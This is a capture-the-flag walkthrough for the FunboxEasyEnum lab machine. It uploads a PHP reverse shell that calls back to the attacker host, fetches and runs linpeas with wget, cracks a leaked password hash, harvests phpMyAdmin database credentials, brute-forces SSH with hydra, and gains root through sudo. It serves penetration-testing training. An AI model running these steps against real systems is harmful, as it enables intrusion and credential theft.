# FunboxEasyEnum

## Nmap scan

```shell
$ nmap -sV -sC -p- funboxeasyenum --min-rate=10000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 20:59 EDT
Nmap scan report for funboxeasyenum (192.168.182.132)
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 (RSA)
|   256 d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 (ECDSA)
|_  256 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
```

## Enumeration

```shell
dirsearch -u http://funboxeasyenum
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_funboxeasyenum/_25-05-25_21-00-56.txt

Target: http://funboxeasyenum/

[21:00:56] Starting: 
[21:01:01] 403 -  279B  - /.htaccess.sample
[21:01:01] 403 -  279B  - /.ht_wsr.txt
[21:01:01] 403 -  279B  - /.htaccess.bak1
[21:01:01] 403 -  279B  - /.htaccess_orig
[21:01:01] 403 -  279B  - /.htaccess.save
[21:01:01] 403 -  279B  - /.htaccess.orig
[21:01:01] 403 -  279B  - /.htaccess_extra
[21:01:01] 403 -  279B  - /.htaccess_sc
[21:01:01] 403 -  279B  - /.htaccessBAK
[21:01:01] 403 -  279B  - /.htaccessOLD2
[21:01:01] 403 -  279B  - /.htaccessOLD
[21:01:01] 403 -  279B  - /.httr-oauth
[21:01:01] 403 -  279B  - /.htpasswd_test
[21:01:01] 403 -  279B  - /.htpasswds
[21:01:01] 403 -  279B  - /.htm
[21:01:01] 403 -  279B  - /.html
[21:01:02] 403 -  279B  - /.php
[21:01:26] 301 -  321B  - /javascript  ->  http://funboxeasyenum/javascript/
[21:01:33] 301 -  321B  - /phpmyadmin  ->  http://funboxeasyenum/phpmyadmin/
[21:01:34] 200 -    3KB - /phpmyadmin/doc/html/index.html
[21:01:34] 200 -    3KB - /phpmyadmin/index.php
[21:01:34] 200 -    3KB - /phpmyadmin/
[21:01:37] 200 -   21B  - /robots.txt
[21:01:38] 403 -  279B  - /server-status
[21:01:38] 403 -  279B  - /server-status/

Task Completed
```

None of these pages were of any use, so I decided to enumerate harder.

Since we know that the site runs php, we can narrow our search by searching for pages with the php extension

```shell
gobuster dir -u http://funboxeasyenum/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://funboxeasyenum/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/javascript           (Status: 301) [Size: 321] [--> http://funboxeasyenum/javascript/]
/mini.php             (Status: 200) [Size: 3828]
/phpmyadmin           (Status: 301) [Size: 321] [--> http://funboxeasyenum/phpmyadmin/]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 441118 / 441120 (100.00%)
===============================================================
Finished
===============================================================
```

Another web resource was found which was initially missed.
### http://funboxeasyenum/mini.php

![](../png/funboxeasyenum-mini-shell.png)

It seems like this resource lets the user upload files to `/var/www/html` which is fortunately the web root, because we can upload `php-reverse-shell` and then access it to get a reverse shell.

## Exploitation

```php
 47 set_time_limit (0);
 48 $VERSION = "1.0";
 49 $ip = '192.168.45.169';  // changed
 50 $port = 4444;       // changed
 51 $chunk_size = 1400;
 52 $write_a = null;
 53 $error_a = null;
 54 $shell = 'uname -a; w; id; /bin/sh -i';
 55 $daemon = 0;
 56 $debug = 0;
 57
 58 //
 59 // Daemonise ourself if possible to avoid zombies later
 60 //
 61
 62 // pcntl_fork is hardly ever available, but will allow us to daemonise
 63 // our php process and avoid zombies.  Worth a try...
 64 if (function_exists('pcntl_fork')) {
 65         // Fork and have the parent process exit
 66         $pid = pcntl_fork();
```

After editing, we can upload it to `mini.php`. It should reflect after uploading

![](../png/funboxeasyenum-uploaded.png)

Starting a listener, we access the resource.

```shell
curl http://funboxeasyenum/php-reverse-shell.php
```

```shell
nv -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.182.132] 50364
Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 02:04:53 up  1:18,  0 users,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

## Privilege Escalation

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@funbox7:/$ mkdir /tmp/privesc && cd /tmp/privesc && wget http://192.168.45.169:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```
Linpeas found some interesting configuration files

```shell
<...>
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root www-data 525 Sep 18  2020 /etc/phpmyadmin/config-db.php
-rw-r----- 1 root www-data 8 Sep 18  2020 /etc/phpmyadmin/htpasswd.setup
-rw-r----- 1 root www-data 68 Sep 18  2020 /var/lib/phpmyadmin/blowfish_secret.inc.php
-rw-r----- 1 root www-data 0 Sep 18  2020 /var/lib/phpmyadmin/config.inc.php
<...>
```

```shell
www-data@funbox7:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
karla:x:1000:1000:karla:/home/karla:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
```

Very unusual, but the hash for user `oracle` is present. We can copy and paste the file

We can identify the hash as [md5crypt](https://hashcat.net/wiki/doku.php?id=example_hashes). Using `hashcat` we can perform password cracking.

```shell
hashcat -m 500 passwd /usr/share/wordlists/rockyou.txt
<...>
$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:hiphop

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
```

We can switch to the `oracle` user using `su`

```shell
www-data@funbox7:/$ su oracle
su oracle
Password: hiphop

oracle@funbox7:/$ id && cd ~/
id
uid=1004(oracle) gid=1004(oracle) groups=1004(oracle)
```

Anyway, going back to `www-data` user since the earlier files found by linpeas are not readable by the user `oracle`.

```shell
www-data@funbox7:/etc$ cat /etc/phpmyadmin/config-db.php
cat /etc/phpmyadmin/config-db.php
<?php
##
## database access settings in php format
## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
## by /usr/sbin/dbconfig-generate-include
##
## by default this file is managed via ucf, so you shouldn't have to
## worry about manual changes being silently discarded.  *however*,
## you'll probably also want to edit the configuration file mentioned
## above too.
##
$dbuser='phpmyadmin';
$dbpass='tgbzhnujm!';
$basepath='';
$dbname='phpmyadmin';
$dbserver='localhost';
$dbport='3306';
$dbtype='mysql';
www-data@funbox7:/etc$ 
```

Proper enumeration - noting down the users and passwords from our enumeration so far.

```shell
$ hydra -L users.txt -P passwords.txt ssh://funboxeasyenum
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-25 23:32:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:7/p:1), ~1 try per task
[DATA] attacking ssh://funboxeasyenum:22/
[22][ssh] host: funboxeasyenum   login: karla   password: tgbzhnujm!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-25 23:33:00
```

The password found happens to be re-used for the user `karla`.

```shell
$ ssh karla@funboxeasyenum
The authenticity of host 'funboxeasyenum (192.168.182.132)' can't be established.
ED25519 key fingerprint is SHA256:O6BLR8bFSyZavzqwjyqsKadofhK4GNKalxHMVbZR+5Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'funboxeasyenum' (ED25519) to the list of known hosts.
karla@funboxeasyenum's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May 26 03:36:49 UTC 2025

  System load:  0.0               Processes:             172
  Usage of /:   64.9% of 4.66GB   Users logged in:       0
  Memory usage: 58%               IP address for ens192: 192.168.182.132
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

karla@funbox7:~$ sudo -l
[sudo] password for karla: 
Matching Defaults entries for karla on funbox7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karla may run the following commands on funbox7:
    (ALL : ALL) ALL
karla@funbox7:~$
```

This user has permissions to run all binaries as sudo.

```shell
karla@funbox7:~$ sudo -i
root@funbox7:~# cat proof.txt
```
